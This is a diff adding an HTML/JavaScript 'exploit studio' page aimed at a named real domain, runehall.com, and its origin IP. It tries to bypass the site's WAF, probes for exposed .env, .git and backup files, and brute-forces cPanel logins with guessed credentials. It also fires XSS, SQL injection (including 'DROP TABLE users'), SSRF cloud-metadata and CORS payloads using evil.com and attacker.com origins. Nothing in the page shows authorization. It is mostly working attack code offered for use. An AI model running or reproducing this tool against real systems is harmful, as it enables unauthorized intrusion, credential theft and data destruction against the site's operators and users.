@@ -1,0 +1,622 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>RuneHall Origin - Advanced Exploit Studio + Network Inspector</title>
+<style>
+:root {
+  --bg: #0a0c12; --panel: #11141f; --border: #2a2e3d;
+  --gold: #ffcc33; --red: #ff4444; --green: #44ff44; --text: #ccc;
+  --req-bg: #0f1119; --resp-bg: #0a0c12;
+}
+* { margin:0; padding:0; box-sizing:border-box; }
+body { background:var(--bg); color:var(--text); font-family:monospace; padding:15px; }
+.app-layout { display:flex; gap:15px; flex-wrap:wrap; }
+.main-panel { flex:2; min-width:320px; }
+.side-panel { flex:1.5; min-width:360px; background:var(--panel); border:1px solid var(--border); border-radius:12px; padding:12px; display:flex; flex-direction:column; }
+.panel { background:var(--panel); border:1px solid var(--border); border-radius:8px; padding:15px; margin:10px 0; }
+h2 { color:var(--gold); font-size:14px; margin-bottom:10px; border-bottom:1px solid var(--border); padding-bottom:5px; }
+button {
+  background:linear-gradient(135deg,#ffcc33,#ff8800); color:#000; border:none;
+  padding:12px 24px; border-radius:6px; font-weight:bold; cursor:pointer; margin:3px;
+  font-family:monospace;
+}
+button:hover { filter:brightness(1.1); }
+button.testing { background:#444; color:#888; cursor:not-allowed; }
+.log { 
+  background:#0a0c12; border:1px solid var(--border); border-radius:6px;
+  padding:10px; height:380px; overflow-y:auto; font-size:11px; margin-top:10px;
+}
+.log .crit { color:var(--red); font-weight:bold; }
+.log .warn { color:#ff8800; }
+.log .pass { color:var(--green); }
+.log .info { color:#44aaff; }
+input { 
+  background:#1a1d2b; color:var(--text); border:1px solid var(--border);
+  padding:10px; border-radius:4px; width:100%; margin:5px 0; font-family:monospace;
+}
+.tabs { display:flex; gap:5px; margin-bottom:10px; border-bottom:1px solid var(--border); }
+.tab { 
+  background:var(--panel); border:1px solid var(--border); color:var(--text);
+  padding:8px 16px; border-radius:6px 6px 0 0; cursor:pointer; font-size:12px;
+  transition:0.1s;
+}
+.tab.active { background:var(--gold); color:#000; font-weight:bold; border-bottom:2px solid var(--gold); }
+.badge { display:inline-block; padding:2px 8px; border-radius:10px; font-size:10px; }
+.badge.crit { background:var(--red); color:#fff; }
+.badge.pass { background:var(--green); color:#000; }
+
+/* network log styles */
+.network-list { height: 420px; overflow-y: auto; margin-top: 8px; font-size: 11px; }
+.network-entry {
+  background: #0a0d16; border-left: 3px solid var(--border); margin-bottom: 6px;
+  border-radius: 4px; cursor: pointer; transition:0.05s linear;
+}
+.network-entry:hover { background: #141a2a; }
+.network-summary {
+  display: flex; align-items: center; gap: 8px; padding: 8px 10px;
+  font-family: monospace; font-size: 10px;
+}
+.req-method { font-weight: bold; min-width: 45px; color: var(--gold); }
+.req-url { flex:1; white-space: nowrap; overflow-x: hidden; text-overflow: ellipsis; color: #bbddff; }
+.req-status { min-width: 45px; text-align: right; }
+.status-ok { color: var(--green); }
+.status-error { color: var(--red); }
+.status-opaque { color: #aaa; }
+.req-duration { min-width: 55px; color: #999; text-align: right; }
+.network-details {
+  padding: 8px 12px; background: #05070c; border-top: 1px solid var(--border);
+  font-size: 10px; white-space: pre-wrap; word-break: break-all;
+  display: none;
+}
+.network-details.open { display: block; }
+.detail-section { margin-bottom: 12px; }
+.detail-section strong { color: var(--gold); display: block; margin-bottom: 4px; }
+hr { border-color: var(--border); margin: 6px 0; }
+.clear-req-btn { background: #1e1f2e; color: #ccc; padding: 4px 12px; font-size: 10px; margin-left: 8px; border-radius: 20px; }
+</style>
+</head>
+<body>
+
+<h2>⚔️ RuneHall Origin Direct Exploitation + Full Network Inspector</h2>
+
+<div class="app-layout">
+  <div class="main-panel">
+    <div class="panel">
+      <label>Origin IP</label>
+      <input type="text" id="originIP" value="23.111.179.52" placeholder="Origin IP">
+      <label>Target Domain</label>
+      <input type="text" id="targetDomain" value="runehall.com" placeholder="runehall.com">
+      <br>
+      <button onclick="runAll()" id="runBtn">▶ RUN ALL EXPLOITATION VECTORS</button>
+      <button onclick="clearLogsAndNetwork()">🗑 Clear All</button>
+      <button onclick="downloadJSON()">⬇ Download Results + Requests</button>
+    </div>
+
+    <div class="tabs">
+      <div class="tab active" data-tab="live">📡 Live Log</div>
+    </div>
+    <div class="log" id="logBox"></div>
+  </div>
+
+  <div class="side-panel">
+    <div style="display:flex; justify-content: space-between; align-items: center;">
+      <h2>📡 REQUEST / RESPONSE INSPECTOR</h2>
+      <button class="clear-req-btn" onclick="clearNetworkLogs()">Clear requests</button>
+    </div>
+    <div style="font-size:10px; color:#aaa; margin:4px 0;">Each fetch/WS recorded with headers, status & preview</div>
+    <div id="networkLogContainer" class="network-list">
+      <div style="color:#888; text-align:center; padding:20px;">⚡ Requests will appear here in real-time</div>
+    </div>
+  </div>
+</div>
+
+<script>
+// --------------------- GLOBALS -------------------------
+const LOG = document.getElementById('logBox');
+let allResults = {};
+let networkRequests = [];         // array of request objects
+let nextReqId = 0;
+let activeTab = 'live';
+
+// monkey-patch fetch and WebSocket for full transparency
+const originalFetch = window.fetch;
+const originalWebSocket = window.WebSocket;
+
+// helper to truncate & sanitize preview
+function truncate(str, max=600) {
+  if (!str) return '';
+  str = String(str);
+  return str.length > max ? str.substring(0, max) + '…' : str;
+}
+
+// render network log UI
+function renderNetworkLog() {
+  const container = document.getElementById('networkLogContainer');
+  if (!container) return;
+  if (networkRequests.length === 0) {
+    container.innerHTML = '<div style="color:#888; text-align:center; padding:20px;">📭 No requests recorded. Run exploitation to capture.</div>';
+    return;
+  }
+  let html = '';
+  for (let i = networkRequests.length-1; i >= 0; i--) { // show newest first
+    const req = networkRequests[i];
+    const isError = !!req.error;
+    const statusCls = !req.error && req.status ? (req.status >=200 && req.status<300 ? 'status-ok' : 'status-error') : (req.error ? 'status-error' : 'status-opaque');
+    let statusText = req.status ? req.status : (req.error ? 'ERR' : 'OPAQUE');
+    if (req.error) statusText = 'Fail';
+    if (req.type === 'websocket') statusText = req.wsState || 'WS';
+    html += `<div class="network-entry" data-reqid="${req.id}">
+      <div class="network-summary" onclick="toggleNetworkDetails(${req.id})">
+        <span class="req-method">${req.method || (req.type==='websocket'?'WS':(req.method||'GET'))}</span>
+        <span class="req-url" title="${escapeHtml(req.url)}">${truncate(req.url, 70)}</span>
+        <span class="req-duration">${req.durationMs ? req.durationMs+'ms' : '-'}</span>
+        <span class="req-status ${statusCls}">${statusText}</span>
+      </div>
+      <div class="network-details" id="details-${req.id}">
+        <div class="detail-section"><strong>📤 REQUEST</strong>URL: ${escapeHtml(req.url)}<br>Method: ${req.method || 'GET'}</div>
+        <div class="detail-section"><strong>📋 Request Headers</strong><pre style="margin:0;">${escapeHtml(req.requestHeadersPreview || 'none')}</pre></div>
+        <div class="detail-section"><strong>📦 Request Body (preview)</strong><pre style="margin:0;">${escapeHtml(req.requestBodyPreview || '(none)')}</pre></div>
+        <hr>
+        <div class="detail-section"><strong>📥 RESPONSE</strong>Status: ${req.status || (req.error ? 'Error' : 'Opaque/CORS')}<br>Time: ${req.durationMs || 0}ms</div>
+        <div class="detail-section"><strong>📋 Response Headers</strong><pre style="margin:0;">${escapeHtml(req.responseHeadersPreview || '(unavailable due to CORS/opaque)')}</pre></div>
+        <div class="detail-section"><strong>🔍 Response Body Preview</strong><pre style="margin:0; max-height:150px; overflow:auto;">${escapeHtml(req.responseBodyPreview || '(not readable - CORS or opaque response)')}</pre></div>
+        ${req.error ? `<div class="detail-section"><strong>⚠️ ERROR</strong> ${escapeHtml(req.error)}</div>` : ''}
+      </div>
+    </div>`;
+  }
+  container.innerHTML = html;
+}
+
+window.toggleNetworkDetails = function(id) {
+  const el = document.getElementById(`details-${id}`);
+  if (el) el.classList.toggle('open');
+};
+
+function addNetworkEntry(entry) {
+  entry.id = nextReqId++;
+  networkRequests.push(entry);
+  if (networkRequests.length > 180) networkRequests.shift(); // keep memory light
+  renderNetworkLog();
+}
+
+// Helper to extract headers from Headers object
+function headersToPreview(headersObj) {
+  if (!headersObj) return '';
+  try {
+    if (headersObj.forEach) {
+      let out = '';
+      headersObj.forEach((val, key) => { out += `${key}: ${val}\n`; });
+      return out.trim() || '(empty)';
+    } else if (typeof headersObj === 'object') {
+      return Object.entries(headersObj).map(([k,v]) => `${k}: ${v}`).join('\n') || '(empty)';
+    }
+  } catch(e) { return '(unavailable)'; }
+  return '(unavailable)';
+}
+
+// monkey-patch fetch with recording
+window.fetch = async function(...args) {
+  const [url, options = {}] = args;
+  const startTime = performance.now();
+  const method = options.method || 'GET';
+  let requestHeaders = { ...(options.headers || {}) };
+  let requestBodyPreview = '';
+  if (options.body) {
+    if (typeof options.body === 'string') requestBodyPreview = truncate(options.body, 400);
+    else if (options.body instanceof URLSearchParams) requestBodyPreview = truncate(options.body.toString(), 400);
+    else if (options.body instanceof FormData) requestBodyPreview = '[FormData]';
+    else requestBodyPreview = '[binary/stream]';
+  }
+  const reqUrl = typeof url === 'string' ? url : url.url;
+  
+  let responseObj = null;
+  let errorInfo = null;
+  let responseStatus = null;
+  let responseHeadersPreview = '';
+  let responseBodyPreview = '';
+  
+  try {
+    const fetchPromise = originalFetch.apply(this, args);
+    // we need to clone to read body without breaking original flow
+    const response = await fetchPromise;
+    responseStatus = response.status;
+    // Capture response headers (safe)
+    try {
+      const headersCopy = new Headers(response.headers);
+      responseHeadersPreview = headersToPreview(headersCopy);
+    } catch(e) { responseHeadersPreview = '(headers not accessible)'; }
+    
+    // Try to read body text but keep original response for caller
+    let clonedResponse = null;
+    try {
+      clonedResponse = response.clone();
+      const text = await clonedResponse.text();
+      responseBodyPreview = truncate(text, 800);
+    } catch(cloneErr) {
+      responseBodyPreview = '(cannot read body: CORS or opaque/no-cors)';
+      if (response.type === 'opaque') responseBodyPreview = '(opaque response: CORS policy blocked access)';
+    }
+    responseObj = response;
+  } catch(err) {
+    errorInfo = err.message;
+    responseStatus = null;
+    responseBodyPreview = `Request failed: ${err.message}`;
+  }
+  
+  const duration = Math.round(performance.now() - startTime);
+  const entry = {
+    type: 'fetch',
+    url: reqUrl,
+    method: method,
+    status: responseStatus,
+    durationMs: duration,
+    requestHeadersPreview: headersToPreview(requestHeaders),
+    requestBodyPreview: requestBodyPreview,
+    responseHeadersPreview: responseHeadersPreview,
+    responseBodyPreview: responseBodyPreview,
+    error: errorInfo,
+    timestamp: new Date().toISOString()
+  };
+  addNetworkEntry(entry);
+  
+  if (responseObj) return responseObj;
+  throw new Error(errorInfo);
+};
+
+// WebSocket interceptor with recording
+window.WebSocket = function(...args) {
+  const wsUrl = args[0];
+  const startTime = performance.now();
+  let wsState = 'connecting';
+  let messagesReceived = [];
+  const ws = new originalWebSocket(...args);
+  
+  const onOpenHandler = (event) => {
+    wsState = 'open';
+    durationMs = Math.round(performance.now() - startTime);
+    updateEntry();
+  };
+  const onErrorHandler = (err) => {
+    wsState = 'error';
+    durationMs = Math.round(performance.now() - startTime);
+    updateEntry();
+  };
+  const onCloseHandler = () => {
+    if (wsState !== 'error') wsState = 'closed';
+    durationMs = Math.round(performance.now() - startTime);
+    updateEntry();
+  };
+  const onMessageHandler = (ev) => {
+    let dataPreview = '';
+    if (ev.data) dataPreview = truncate(typeof ev.data === 'string' ? ev.data : '[binary]', 200);
+    messagesReceived.push(dataPreview);
+    updateEntry();
+  };
+  
+  ws.addEventListener('open', onOpenHandler);
+  ws.addEventListener('error', onErrorHandler);
+  ws.addEventListener('close', onCloseHandler);
+  ws.addEventListener('message', onMessageHandler);
+  
+  let durationMs = 0;
+  let finalized = false;
+  function updateEntry() {
+    if (finalized) return;
+    const entry = {
+      type: 'websocket',
+      url: wsUrl,
+      method: 'WS',
+      status: null,
+      durationMs: durationMs,
+      wsState: wsState,
+      requestHeadersPreview: '(WebSocket handshake)',
+      requestBodyPreview: '(initial handshake)',
+      responseHeadersPreview: '(Upgrade response)',
+      responseBodyPreview: messagesReceived.length ? `Messages (${messagesReceived.length}): ${messagesReceived.join(' | ')}` : '(no messages)',
+      error: wsState === 'error' ? 'WebSocket connection error' : null,
+      timestamp: new Date().toISOString()
+    };
+    addNetworkEntry(entry);
+    finalized = true;
+  }
+  // fallback final update after 2 seconds if never opened
+  setTimeout(() => {
+    if (!finalized) {
+      wsState = wsState === 'connecting' ? 'timeout' : wsState;
+      durationMs = Math.round(performance.now() - startTime);
+      updateEntry();
+    }
+  }, 3500);
+  
+  return ws;
+};
+
+// helpers
+function escapeHtml(str) { if(!str) return ''; return String(str).replace(/[&<>]/g, function(m){if(m==='&') return '&amp;'; if(m==='<') return '&lt;'; if(m==='>') return '&gt;'; return m;}); }
+
+function log(msg, cls='info') {
+  const d = document.createElement('div');
+  d.className = cls;
+  d.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+  LOG.appendChild(d);
+  LOG.scrollTop = LOG.scrollHeight;
+}
+
+function clearLogs() { LOG.innerHTML = ''; }
+function clearNetworkLogs() { networkRequests = []; renderNetworkLog(); }
+function clearLogsAndNetwork() { clearLogs(); clearNetworkLogs(); allResults = {}; log('Cleared all logs and network inspector', 'info'); }
+
+// ----------------- ORIGINAL TEST VECTORS (now auto-recorded via patched fetch/WS) -----------------
+async function testOriginHTTP() {
+  const origin = document.getElementById('originIP').value;
+  const domain = document.getElementById('targetDomain').value;
+  log('=== VECTOR 1: DIRECT ORIGIN HTTP ATTACKS ===', 'info');
+  allResults.origin_http = {};
+
+  try {
+    const r = await fetch(`https://${origin}/`, { headers: { 'Host': domain }, signal: AbortSignal.timeout(6000) });
+    const text = await r.text();
+    allResults.origin_http.https_reachable = true;
+    allResults.origin_http.https_status = r.status;
+    allResults.origin_http.body_preview = text.substring(0, 500);
+    log(`ORIGIN HTTPS REACHABLE: ${r.status} — WAF BYPASS CONFIRMED`, 'crit');
+  } catch(e) {
+    allResults.origin_http.https_reachable = false;
+    log(`Origin HTTPS blocked or unreachable: ${e.message}`, 'pass');
+  }
+
+  try {
+    const r = await fetch(`http://${origin}/`, { headers: { 'Host': domain }, signal: AbortSignal.timeout(5000) });
+    allResults.origin_http.http_reachable = true;
+    allResults.origin_http.http_status = r.status;
+    log(`ORIGIN HTTP REACHABLE: ${r.status} — No TLS required`, 'crit');
+  } catch(e) {
+    allResults.origin_http.http_reachable = false;
+    log(`Origin HTTP blocked: ${e.message}`, 'pass');
+  }
+
+  const paths = ['/.env', '/.git/config', '/phpinfo.php', '/wp-config.php.bak', '/admin', '/wp-admin', '/api/users', '/config.js', '/backup.sql'];
+  allResults.origin_http.exposed_files = [];
+  for (const path of paths) {
+    try {
+      const r = await fetch(`https://${origin}${path}`, { headers: { 'Host': domain }, signal: AbortSignal.timeout(4000) });
+      if (r.status !== 404 && r.status !== 403) {
+        allResults.origin_http.exposed_files.push({ path, status: r.status });
+        log(`EXPOSED on origin: ${path} → HTTP ${r.status}`, 'crit');
+      }
+    } catch(e) {}
+  }
+}
+
+async function testCPanel() {
+  const origin = document.getElementById('originIP').value;
+  log('=== VECTOR 2: CPANEL / WHM DIRECT ATTACK ===', 'info');
+  allResults.cpanel = {};
+  const cpanelPorts = [2083, 2087, 2096];
+  for (const port of cpanelPorts) {
+    try {
+      const controller = new AbortController();
+      const timeout = setTimeout(() => controller.abort(), 4000);
+      const r = await fetch(`https://${origin}:${port}/`, { signal: controller.signal, mode: 'no-cors' });
+      clearTimeout(timeout);
+      allResults.cpanel[`port_${port}`] = 'OPEN';
+      log(`CPANEL PORT ${port} OPEN — Brute-force vector confirmed`, 'crit');
+    } catch(e) {
+      allResults.cpanel[`port_${port}`] = 'CLOSED/FILTERED';
+      log(`Port ${port}: closed or filtered`, 'pass');
+    }
+  }
+
+  if (allResults.cpanel['port_2083'] === 'OPEN') {
+    const users = ['root', 'admin', 'runehall', 'gary'];
+    const passes = ['password', 'admin123', 'runehall2024', 'changeme', 'RuneHall2024!'];
+    allResults.cpanel.bruteforce_attempts = [];
+    for (const user of users) {
+      for (const pass of passes) {
+        try {
+          const formData = new URLSearchParams();
+          formData.append('user', user);
+          formData.append('pass', pass);
+          const r = await fetch(`https://${origin}:2083/login/?login_only=1`, {
+            method: 'POST', body: formData, headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, signal: AbortSignal.timeout(5000)
+          });
+          const text = await r.text();
+          if (!text.includes('Login denied') && !text.includes('Invalid')) {
+            allResults.cpanel.credentials_found = { user, pass };
+            log(`CPANEL CREDENTIALS FOUND: ${user}:${pass} !!!`, 'crit');
+            return;
+          }
+          allResults.cpanel.bruteforce_attempts.push({ user, pass, result: 'failed' });
+        } catch(e) { allResults.cpanel.bruteforce_attempts.push({ user, pass, result: 'error' }); }
+        await new Promise(r => setTimeout(r, 300));
+      }
+    }
+    log('Brute-force complete — no easy credentials found', 'info');
+  }
+}
+
+async function testXSSOrigin() {
+  const origin = document.getElementById('originIP').value;
+  const domain = document.getElementById('targetDomain').value;
+  log('=== VECTOR 3: XSS REFLECTION (ORIGIN BYPASS) ===', 'info');
+  allResults.xss_origin = [];
+  const payloads = ['<img src=x onerror="console.log(\'XSS_ORIGIN\')">', '"><svg/onload=console.log(\'XSS_ORIGIN\')>', '<script>console.log("XSS_ORIGIN")</script>', '\' onfocus="console.log(\'XSS_ORIGIN\')" autofocus'];
+  const endpoints = ['/search?q=', '/api/search?term=', '/?s=', '/chat?msg=', '/api/bet?amount=', '/referral?code=', '/login?redirect='];
+  for (const ep of endpoints) {
+    for (const payload of payloads) {
+      try {
+        const url = `https://${origin}${ep}${encodeURIComponent(payload)}`;
+        const r = await fetch(url, { headers: { 'Host': domain }, signal: AbortSignal.timeout(5000) });
+        const text = await r.text();
+        if (text.includes(payload) || text.includes('XSS_ORIGIN')) {
+          allResults.xss_origin.push({ endpoint: ep, payload: payload.substring(0, 40), status: r.status });
+          log(`XSS REFLECTED via ORIGIN: ${ep} — Cloudflare WAF BYPASSED`, 'crit');
+          break;
+        }
+      } catch(e) {}
+    }
+  }
+  if (allResults.xss_origin.length === 0) log('No reflected XSS found via origin', 'pass');
+}
+
+async function testSQLiOrigin() {
+  const origin = document.getElementById('originIP').value;
+  const domain = document.getElementById('targetDomain').value;
+  log('=== VECTOR 4: SQLi FUZZING (ORIGIN BYPASS) ===', 'info');
+  allResults.sqli_origin = [];
+  const payloads = ["' OR '1'='1", "' OR 1=1--", "1' AND SLEEP(0)--", "'; DROP TABLE users--", "' UNION SELECT 1,2,3--"];
+  const endpoints = ['/api/users?id=', '/api/login?user=', '/api/search?q=', '/api/referral?code=', '/api/bet?amount=', '/api/history?page='];
+  const errorKeywords = ['sql', 'mysql', 'syntax', 'error', 'database', 'warning', 'unclosed', 'column', 'table'];
+  for (const ep of endpoints) {
+    for (const payload of payloads.slice(0, 3)) {
+      try {
+        const start = performance.now();
+        const url = `https://${origin}${ep}${encodeURIComponent(payload)}`;
+        const r = await fetch(url, { headers: { 'Host': domain }, signal: AbortSignal.timeout(8000) });
+        const elapsed = performance.now() - start;
+        const text = await r.text();
+        const hasError = errorKeywords.some(kw => text.toLowerCase().includes(kw));
+        if (hasError || elapsed > 4000) {
+          allResults.sqli_origin.push({ endpoint: ep, payload: payload.substring(0,30), error_based: hasError, time_based: elapsed>4000, response_time_ms: Math.round(elapsed) });
+          log(`SQLi SIGNATURE via ORIGIN: ${ep} (error=${hasError}, time=${Math.round(elapsed)}ms)`, 'crit');
+          break;
+        }
+      } catch(e) {}
+    }
+  }
+  if (allResults.sqli_origin.length === 0) log('No SQLi signatures found via origin', 'pass');
+}
+
+async function testSSRF() {
+  const origin = document.getElementById('originIP').value;
+  const domain = document.getElementById('targetDomain').value;
+  log('=== VECTOR 5: SSRF / CLOUD METADATA PROBE ===', 'info');
+  allResults.ssrf = [];
+  const ssrfTargets = [
+    { name: 'AWS Metadata', url: 'http://169.254.169.254/latest/meta-data/' },
+    { name: 'GCP Metadata', url: 'http://metadata.google.internal/computeMetadata/v1/' },
+    { name: 'DigitalOcean', url: 'http://169.254.169.254/metadata/v1/' },
+    { name: 'Azure Metadata', url: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' },
+  ];
+  const ssrfEndpoints = ['/proxy?url=', '/api/fetch?url=', '/api/proxy?target='];
+  for (const ep of ssrfEndpoints) {
+    for (const target of ssrfTargets) {
+      try {
+        const url = `https://${origin}${ep}${encodeURIComponent(target.url)}`;
+        const r = await fetch(url, { headers: { 'Host': domain }, signal: AbortSignal.timeout(5000) });
+        const text = await r.text();
+        if (text.includes('instance-id') || text.includes('ami-id') || text.includes('computeMetadata')) {
+          allResults.ssrf.push({ endpoint: ep, target: target.name, success: true });
+          log(`SSRF SUCCESS: ${target.name} via ${ep}`, 'crit');
+        }
+      } catch(e) {}
+    }
+  }
+  for (const target of ssrfTargets) {
+    try {
+      const r = await fetch(`https://${origin}/`, { headers: { 'Host': target.url.replace('http://', ''), 'X-Forwarded-Host': target.url }, signal: AbortSignal.timeout(4000) });
+      if (r.status !== 400 && r.status !== 404) {
+        allResults.ssrf.push({ target: target.name, method: 'host_header_injection', status: r.status });
+        log(`Potential SSRF via Host header: ${target.name} returned ${r.status}`, 'warn');
+      }
+    } catch(e) {}
+  }
+  if (allResults.ssrf.length === 0) log('No SSRF vulnerabilities found', 'pass');
+}
+
+async function testWebSocket() {
+  const origin = document.getElementById('originIP').value;
+  const domain = document.getElementById('targetDomain').value;
+  log('=== VECTOR 6: WEBSOCKET INTERCEPTION PROBE ===', 'info');
+  allResults.websocket = {};
+  const wsEndpoints = [`wss://${origin}/ws`, `wss://${origin}/socket.io/`, `wss://${origin}/api/ws`, `wss://${domain}/ws`, `wss://${domain}/socket.io/`];
+  for (const wsUrl of wsEndpoints) {
+    try {
+      const ws = new WebSocket(wsUrl);
+      const result = await new Promise((resolve) => {
+        const timeout = setTimeout(() => { ws.close(); resolve({ endpoint: wsUrl, result: 'timeout' }); }, 4000);
+        ws.onopen = () => { clearTimeout(timeout); ws.send(JSON.stringify({ type: 'ping', data: 'origin_test' })); resolve({ endpoint: wsUrl, result: 'connected' }); };
+        ws.onerror = () => { clearTimeout(timeout); resolve({ endpoint: wsUrl, result: 'error' }); };
+        ws.onmessage = (event) => { allResults.websocket.message_received = event.data.substring(0,200); resolve({ endpoint: wsUrl, result: 'data_received' }); };
+      });
+      if (result.result === 'connected') { log(`WebSocket OPEN: ${wsUrl}`, 'warn'); allResults.websocket.ws_open = true; ws.close(); }
+    } catch(e) {}
+  }
+  if (!allResults.websocket.ws_open) log('WebSocket connections blocked (good)', 'pass');
+}
+
+async function testCORS() {
+  const origin = document.getElementById('originIP').value;
+  const domain = document.getElementById('targetDomain').value;
+  log('=== VECTOR 7: CORS MISCONFIGURATION TEST ===', 'info');
+  allResults.cors = [];
+  const testOrigins = ['https://evil.com', 'null', `https://${origin}`, 'https://attacker.com'];
+  const endpoints = [`https://${domain}/api/users`, `https://${domain}/api/user/profile`, `https://${origin}/api/users`, `https://${origin}/api/user/profile`];
+  for (const ep of endpoints) {
+    for (const testOrigin of testOrigins) {
+      try {
+        const r = await fetch(ep, { headers: { 'Origin': testOrigin, 'Host': domain }, signal: AbortSignal.timeout(5000) });
+        const acao = r.headers.get('access-control-allow-origin');
+        const acac = r.headers.get('access-control-allow-credentials');
+        if (acao === '*' || acao === testOrigin) {
+          allResults.cors.push({ endpoint: ep, origin: testOrigin, allow_origin: acao, allow_credentials: acac, vulnerable: acao === '*' || (acao === testOrigin && acac === 'true') });
+          log(`CORS MISCONFIG: ${ep} allows ${testOrigin} (creds: ${acac})`, 'crit');
+        }
+      } catch(e) {}
+    }
+  }
+  if (allResults.cors.length === 0) log('No CORS misconfigurations found', 'pass');
+}
+
+async function runAll() {
+  const runBtn = document.getElementById('runBtn');
+  runBtn.disabled = true;
+  runBtn.textContent = '⏳ RUNNING ALL VECTORS...';
+  runBtn.classList.add('testing');
+  allResults = { target: document.getElementById('targetDomain').value, origin: document.getElementById('originIP').value, timestamp: new Date().toISOString() };
+  try {
+    await testOriginHTTP();
+    await testCPanel();
+    await testXSSOrigin();
+    await testSQLiOrigin();
+    await testSSRF();
+    await testWebSocket();
+    await testCORS();
+    log('═══════════════════════════════', 'info');
+    log('ALL VECTORS COMPLETE', 'pass');
+    const summary = {
+      origin_reachable: allResults.origin_http?.https_reachable || allResults.origin_http?.http_reachable,
+      cpanel_open: allResults.cpanel?.port_2083 === 'OPEN',
+      cpanel_creds: allResults.cpanel?.credentials_found || null,
+      xss_found: allResults.xss_origin?.length || 0,
+      sqli_found: allResults.sqli_origin?.length || 0,
+      ssrf_found: allResults.ssrf?.length || 0,
+      cors_found: allResults.cors?.length || 0,
+    };
+    allResults.summary = summary;
+    log(`Summary: Origin=${summary.origin_reachable}, cPanel=${summary.cpanel_open}, XSS=${summary.xss_found}, SQLi=${summary.sqli_found}`, 'info');
+  } catch(e) { log(`FATAL: ${e.message}`, 'crit'); } finally {
+    runBtn.disabled = false;
+    runBtn.textContent = '▶ RUN ALL EXPLOITATION VECTORS';
+    runBtn.classList.remove('testing');
+  }
+}
+
+function downloadJSON() {
+  const exportData = { ...allResults, network_requests: networkRequests.map(r => ({ ...r, responseBodyPreview: truncate(r.responseBodyPreview||'',500) })) };
+  const blob = new Blob([JSON.stringify(exportData, null, 2)], { type: 'application/json' });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = `runehall_full_audit_${new Date().toISOString().slice(0,10)}.json`;
+  a.click();
+  URL.revokeObjectURL(url);
+}
+
+log('✅ Advanced inspector ready — each request/response captured in side panel', 'pass');
+log('Configure origin IP and target domain, then click RUN', 'info');
+</script>
+</body>
+</html>
